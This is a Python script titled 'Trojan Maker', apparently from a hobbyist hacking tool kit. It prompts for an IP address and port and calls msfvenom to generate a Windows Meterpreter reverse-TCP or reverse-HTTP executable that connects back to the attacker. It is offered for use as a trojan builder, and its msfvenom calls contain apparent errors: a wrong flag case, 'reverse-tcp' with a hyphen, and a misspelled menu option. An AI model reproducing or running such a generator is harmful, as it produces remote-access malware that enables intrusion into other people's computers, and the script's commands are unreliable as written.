import os , time
from client.client import client
from client.text_color import color

def main():
    
    client().system("clear")

    client().system(f"figlet Trojan Maker")

    client().puts(f"\nWelcome to Trojan Maker\n\ngithub.com/CryonicsX")

    client().puts("""
1: Start the Script
2: MENU
    """)

    selection = client().read(f"Enter transaction number ")

    if selection == "1":

        ip = client().read(f"{color.GREEN}Enter Local or Dis IP{color.RESET_ALL} ")
        port = client().read(f"{color.GREEN}Enter port{color.RESET_ALL} ")

        client().puts(f"""
        1: windows/meterpreter/reverse-tcp
        2: windows/meterpreter/recerse-http
        
        """)

        payload = client().read(f"{color.GREEN}Enter the number ")
        logs = client().read(f"Enter the log file location {color.RESET_ALL}")
        client().puts(f"{color.GREEN}[✔] Starting ...{color.RESET_ALL}")
        time.sleep(2.5)
        if payload == "1":
            client().system(f"msfvenom -P windows/meterpreter/reverse-tcp LHOST={ip} LPORT={port} -f exe -o{logs}")
        
        elif payload == "2":
            client().system(f"msfvenom -P windows/meterpreter/reverse-http LHOST={ip} LPORT={port} -f exe -o{logs}")

    elif selection == "2":
        client().system("python3 main.py")

    else:
        client().puts("There is no such option")
    
    returnED = client().read(f"{color.GREEN} Do you want to make a new make?(Y/N) {color.RESET_ALL}").lower()

    if returnED == "y":
        client().system("python3 tools/trojan_maker.py")


    elif returnED == "n":
        client().puts(f"""
View My Other Projects On Github:

{color.YELLOW}https://github.com/CryonicsX\n\nhttps://github.com/Reflechir{color.RESET_ALL}

goodbye 👍👍
        """)


    else:
        client().puts("There is no such option")


if __name__ == '__main__' and os.name == 'posix':
    if os.getuid() == 0:
        main()
else:
    client().puts(f"""
    
{color.GREEN}    
█░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀   ▀█▀ █▀█ █▀█ █░░   █▄▀ █ ▀█▀ █▀    Developed by CryonicX & Ref
█▀█ █▀█ █▄▄ █░█ █ █░▀█ █▄█   ░█░ █▄█ █▄█ █▄▄   █░█ █ ░█░ ▄█
{color.RESET_ALL}

{color.RED}[!] You can run this script only on debian system.{color.RESET_ALL}

        
View My Other Projects On Github:

{color.YELLOW}https://github.com/CryonicsX\n\nhttps://github.com/Reflechir{color.RESET_ALL}

goodbye 👍👍
    """)
